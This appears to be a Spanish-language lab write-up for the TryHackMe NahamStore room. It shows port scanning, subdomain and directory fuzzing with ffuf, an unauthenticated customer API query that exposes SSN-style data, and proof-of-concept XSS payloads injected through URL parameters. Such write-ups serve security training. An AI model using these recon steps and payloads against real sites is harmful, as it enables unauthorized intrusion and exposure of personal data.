
## agregar a hosts
```
10.10.112.225 nahamstore.thm www.nahamstore.thm
```

## escaneo de puertos con rustscan (instaldo del git/releases<)
```bash
rustscan -a nahamstore.thm -- -sC -sV
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.112.225:22
Open 10.10.112.225:80
Open 10.10.112.225:8000
[~] Starting Nmap
[>] The Nmap command to be run is nmap -sC -sV -vvv -p 22,80,8000 10.10.112.225

Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-11 18:15 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:15
Completed NSE at 18:15, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:15
Completed NSE at 18:15, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:15
Completed NSE at 18:15, 0.00s elapsed
Initiating Ping Scan at 18:15
Scanning 10.10.112.225 [2 ports]
Completed Ping Scan at 18:15, 0.25s elapsed (1 total hosts)
Initiating Connect Scan at 18:15
Scanning nahamstore.thm (10.10.112.225) [3 ports]
Discovered open port 80/tcp on 10.10.112.225
Discovered open port 22/tcp on 10.10.112.225
Discovered open port 8000/tcp on 10.10.112.225
Completed Connect Scan at 18:15, 0.20s elapsed (3 total ports)
Initiating Service scan at 18:15
Scanning 3 services on nahamstore.thm (10.10.112.225)
Completed Service scan at 18:15, 11.73s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.112.225.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:15
Completed NSE at 18:15, 6.31s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:15
Completed NSE at 18:15, 0.81s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:15
Completed NSE at 18:15, 0.00s elapsed
Nmap scan report for nahamstore.thm (10.10.112.225)
Host is up, received syn-ack (0.24s latency).
Scanned at 2023-01-11 18:15:19 EST for 19s

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 846e52cadb9edf0aaeb5703d07d69178 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDk0dfNL0GNTinnjUpwRlY3LsS7cLO2jAp3QRvFXOB+s+bPPk+m4duQ95Z6qagERl/ovdPsSJTdiPXy2Qpf+aZI4ba2DvFWfvFzfh9Jrx7rvzrOj0i0kUUwot9WmxhuoDfvTT3S6LmuFw7SAXVTADLnQIJ4k8URm5wQjpj86u7IdCEsIc126krLk2Nb7A3qoWaI+KJw0UHOR6/dhjD72Xl0ttvsEHq8LPfdEhPQQyefozVtOJ50I1Tc3cNVsz/wLnlLTaVui2oOXd/P9/4hIDiIeOI0bSgvrTToyjjTKH8CDet8cmzQDqpII6JCvmYhpqcT5nR+pf0QmytlUJqXaC6T
|   256 1a1ddbca998a64b18b10dfa939d55cd3 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBC/YPu9Zsy/Gmgz+aLeoHKA1L5FO8MqiyEaalrkDetgQr/XoRMvsIeNkArvIPMDUL2otZ3F57VBMKfgydtBcOIA=
|   256 f63616b7668e7b350907cb90c9846338 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPAicOmkn8r1FCga8kLxn9QC7NdeGg0bttFiaaj11qec
80/tcp   open  http    syn-ack nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST
| http-cookie-flags: 
|   /: 
|     session: 
|_      httponly flag not set
|_http-title: NahamStore - Home
8000/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-open-proxy: Proxy might be redirecting requests
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods: 
|_  Supported Methods: GET HEAD POST
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:15
Completed NSE at 18:15, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:15
Completed NSE at 18:15, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:15
Completed NSE at 18:15, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.14 seconds

```
## dnsbrute para descubrir dominios
```bash
ffuf -u http://nahamstore.thm -c -w /tools/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.nahamstore.thm' -fw 125 -t 100

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.5.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://nahamstore.thm
 :: Wordlist         : FUZZ: /tools/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.nahamstore.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response words: 125
________________________________________________

www                     [Status: 301, Size: 194, Words: 7, Lines: 8, Duration: 200ms]
shop                    [Status: 301, Size: 194, Words: 7, Lines: 8, Duration: 221ms]
marketing               [Status: 200, Size: 2025, Words: 692, Lines: 42, Duration: 202ms]
stock                   [Status: 200, Size: 67, Words: 1, Lines: 1, Duration: 198ms]
:: Progress: [4989/4989] :: Job [1/1] :: 495 req/sec :: Duration: [0:00:10] :: Errors: 0 ::
```

## los agregamos a hosts, hay otro que no se econtro aqui pero sale luego de otro lado RCE (nahamstore-2020-dev)
```bash
10.10.178.164 nahamstore.thm www.nahamstore.thm shop.nahamstore.thm marketing.nahamstore.thm stock.nahamstore.thm nahamstore-2020-dev.nahamstore.thm
```

### fuzzeamos el dominio estrella
```bash
ffuf -u http://nahamstore-2020-dev.nahamstore.thm/FUZZ -c -w /tools/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -t 100 -fs 194

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.5.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://nahamstore-2020-dev.nahamstore.thm/FUZZ
 :: Wordlist         : FUZZ: /tools/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 194
________________________________________________

api                     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 206ms]
```

### fuzeamo el api
```bash
ffuf -u http://nahamstore-2020-dev.nahamstore.thm/api/FUZZ -c -w /tools/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -t 100 -fs 194

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.5.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://nahamstore-2020-dev.nahamstore.thm/api/FUZZ
 :: Wordlist         : FUZZ: /tools/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 194
________________________________________________

customers               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 206ms]
```
### tenemos ahora /api/customers, consultamos:
```bash
 curl http://nahamstore-2020-dev.nahamstore.thm/api/customers/
["customer_id is required"]#
```

```bash
curl http://nahamstore-2020-dev.nahamstore.thm/api/customers/\?customer_id\=2 -s | jq
{
  "id": 2,
  "name": "Jimmy Jones",
  "email": "jd.jones1997@yahoo.com",
  "tel": "501-392-5473",
  "ssn": "521-61-6392"
```

## Fuzeamos el resto de los dominios

### shoping
```bash
ffuf -u http://nahamstore.thm/FUZZ -c -w /tools/wordlists/seclists/Discovery/Web-Content/big.txt -t 100

basket                  [Status: 200, Size: 2465, Words: 647, Lines: 54, Duration: 304ms]
css                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 204ms]
js                      [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 222ms]
login                   [Status: 200, Size: 3099, Words: 847, Lines: 61, Duration: 249ms]
logout                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 253ms]
register                [Status: 200, Size: 3138, Words: 904, Lines: 60, Duration: 250ms]
returns                 [Status: 200, Size: 3628, Words: 1055, Lines: 75, Duration: 262ms]
robots.txt              [Status: 200, Size: 13, Words: 2, Lines: 1, Duration: 197ms]
search                  [Status: 200, Size: 3351, Words: 776, Lines: 72, Duration: 251ms]
staff                   [Status: 200, Size: 2287, Words: 751, Lines: 51, Duration: 226ms]
uploads                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 197ms]
:: Progress: [20476/20476] :: Job [1/1] :: 424 req/sec :: Duration: [0:00:53] :: Errors: 0 ::
 
```

### marketing 
```
ffuf -u http://marketing.nahamstore.thm/FUZZ -c -w /tools/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
10B1B6E747C29A71C12570A8004F2606 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 261ms]
ce053af5a230d6e6fba69e83b538c0c3 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 204ms]
24BF2BC7CA735EED4A256B4800162838 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 204ms]
9c678349c6517f9b32afce91a4299ffc [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 213ms]
dc25659fbeac0af10281af48b04244d1 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 217ms]
// nada //

ffuf -u http://marketing.nahamstore.thm/\?FUZZ -c -w /tools/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -fs 2025
error                   [Status: 200, Size: 2168, Words: 751, Lines: 45, Duration: 270ms]
```


## XSS

http://marketing.nahamstore.thm/?error=
<script>alert(document.domain.concat("\n").concat(window.origin))</script>
<script>console.log("Test XSS from the search bar of page XYZ\n".concat(document.domain).concat("\n").concat(window.origin))</script>

http://nahamstore.thm/product?id=2&name=%3C/title%3E%3Cscript%3Ealert(1)%3C/script%3E




## Referencias

- https://blog.raw.pm/en/TryHackMe-Nahamstore-write-up/#Overview


